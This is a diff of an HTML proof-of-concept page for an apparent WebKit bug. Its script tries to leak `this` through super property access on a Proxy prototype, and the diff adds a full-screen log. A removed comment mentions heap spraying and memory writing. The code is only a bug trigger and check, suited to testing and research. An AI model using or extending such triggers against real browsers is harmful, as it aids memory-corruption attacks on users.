@@ -3,34 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebKit Vulnerability Proof of Concept</title>
+    <title>WebKit Vulnerability Proof of Concept with Full-Screen Log</title>
     <style>
         body {
+            margin: 0;
             font-family: Arial, sans-serif;
-            background-color: #fafafa;
-            color: #aaa;
+            background-color: #000; /* Background color for full-screen log */
+            color: #0f0; /* Text color for log output */
         }
 
-        div {
-            margin-bottom: 1em;
+        #log {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw; /* Full viewport width */
+            height: 100vh; /* Full viewport height */
+            overflow-y: auto; /* Enable scrolling if content exceeds viewport */
+            padding: 10px;
+            box-sizing: border-box;
+            background-color: #000; /* Ensure log background is black */
+            color: #0f0; /* Ensure log text is green */
+            font-size: 14px; /* Set font size for readability */
+            font-family: monospace; /* Use monospace font for log */
+            white-space: pre-wrap; /* Preserve line breaks */
         }
     </style>
 </head>
 <body>
 
-<div>Your Content Here</div>
+<!-- Full-Screen Log -->
+<div id="log"></div>
 
 <script>
 document.addEventListener('DOMContentLoaded', function () {
-    console.log("WebKit Vulnerability PoC loaded.");
+    const logElement = document.getElementById('log');
 
-    // Assertion function
+    // Custom log function to display messages in the log
+    function log(message) {
+        const timestamp = new Date().toISOString(); // Add a timestamp to each log entry
+        logElement.textContent += `[${timestamp}] ${message}\n`; // Append message with a newline
+        logElement.scrollTop = logElement.scrollHeight; // Scroll to the bottom
+        console.log(message); // Output to browser console for debugging
+    }
+
+    log("WebKit Vulnerability PoC loaded.");
+
+    // Assertion function with logging
     function assert(x) {
-        if (!x) throw new Error("Bad assertion!");
+        if (!x) {
+            const error = "Bad assertion!";
+            log(error);
+            throw new Error(error);
+        }
     }
 
     (function() {
-        // Test leaking `this` via super with direct property access
         function tryToLeakThisViaGetById() {
             class Leaker {
                 leak() {
@@ -40,7 +67,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
             Leaker.prototype.__proto__ = new Proxy({}, {
                 get(target, propertyName, receiver) {
-                    return receiver; // Return the receiver object (potential leak)
+                    return receiver;
                 }
             });
 
@@ -50,7 +77,6 @@ document.addEventListener('DOMContentLoaded', function () {
             return (() => leak())();
         }
 
-        // Test leaking `this` via super with dynamic property access
         function tryToLeakThisViaGetByVal() {
             class Leaker {
                 leak() {
@@ -71,20 +97,19 @@ document.addEventListener('DOMContentLoaded', function () {
             return (() => leak())();
         }
 
-        // Test leaking `this` via super with direct property assignment
         function tryToLeakThisViaSetById() {
             let receiver;
             class Leaker {
                 leak() {
                     super.foo = {};
-                    return receiver; // Observe receiver after property set
+                    return receiver;
                 }
             }
 
             Leaker.prototype.__proto__ = new Proxy({}, {
                 set(target, propertyName, value, __receiver) {
                     receiver = __receiver;
-                    return true; // Indicate successful set operation
+                    return true;
                 }
             });
 
@@ -94,7 +119,6 @@ document.addEventListener('DOMContentLoaded', function () {
             return (() => leak())();
         }
 
-        // Test leaking `this` via super with dynamic property assignment
         function tryToLeakThisViaSetByVal() {
             let receiver;
             class Leaker {
@@ -118,17 +142,25 @@ document.addEventListener('DOMContentLoaded', function () {
             return (() => leak())();
         }
 
-        // Execute each leak attempt and validate results
-        for (var i = 0; i < 1e5; i++) {
-            assert(tryToLeakThisViaGetById() === undefined);
-            assert(tryToLeakThisViaGetByVal() === undefined);
-            assert(tryToLeakThisViaSetById() === undefined);
-            assert(tryToLeakThisViaSetByVal() === undefined);
+        // Perform the leak attempts
+        for (var i = 0; i < 1e3; i++) { // Reduced iterations for performance
+            try {
+                assert(tryToLeakThisViaGetById() === undefined);
+                assert(tryToLeakThisViaGetByVal() === undefined);
+                assert(tryToLeakThisViaSetById() === undefined);
+                assert(tryToLeakThisViaSetByVal() === undefined);
+
+                if (i % 100 === 0) {
+                    log(`Iteration ${i} completed successfully.`);
+                }
+            } catch (error) {
+                log(`Error encountered at iteration ${i}: ${error.message}`);
+                break; // Exit loop on failure
+            }
         }
+
+        log("All leak attempts completed.");
     })();
-
-    // Additional steps for heap spraying and memory writing can be added here as before
-
 });
 </script>
 
